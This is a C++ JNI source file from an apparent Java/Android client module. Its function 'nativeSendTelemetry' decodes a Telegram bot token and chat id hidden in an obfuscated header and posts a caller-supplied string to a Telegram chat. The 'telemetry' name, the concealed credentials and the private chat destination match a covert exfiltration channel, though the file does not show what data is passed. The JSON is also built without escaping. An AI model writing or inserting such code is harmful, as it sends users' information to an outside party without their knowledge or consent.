#include <jni.h>
#include <curl/curl.h>
#include <cstring>
#include <cstdlib>

#include "encoded.h"

struct WriteBuf {
    char* data;
    size_t len;
};

static size_t write_cb(void* ptr, size_t size, size_t nmemb, void* user) {
    size_t total = size * nmemb;
    WriteBuf* buf = (WriteBuf*)user;
    char* newData = (char*)realloc(buf->data, buf->len + total + 1);
    if (!newData) return 0;
    memcpy(newData + buf->len, ptr, total);
    buf->data = newData;
    buf->len += total;
    newData[buf->len] = 0;
    return total;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_ravex_modules_client_TelemetryNative_nativeSendTelemetry(JNIEnv* env, jclass clazz, jstring jInfo) {
    const char* info = env->GetStringUTFChars(jInfo, nullptr);
    if (!info) return JNI_FALSE;

    char token[64], chat[32];
    decode_token(token);
    decode_chat(chat);

    char url[272];
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", token);

    CURL* curl = curl_easy_init();
    if (!curl) {
        env->ReleaseStringUTFChars(jInfo, info);
        return JNI_FALSE;
    }

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    char json[5408];
    snprintf(json, sizeof(json),
             "{\"chat_id\":\"%s\",\"text\":\"%s\"}",
             chat, info);

    WriteBuf response = {nullptr, 0};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (response.data) free(response.data);

    env->ReleaseStringUTFChars(jInfo, info);
    return res == CURLE_OK ? JNI_TRUE : JNI_FALSE;
}
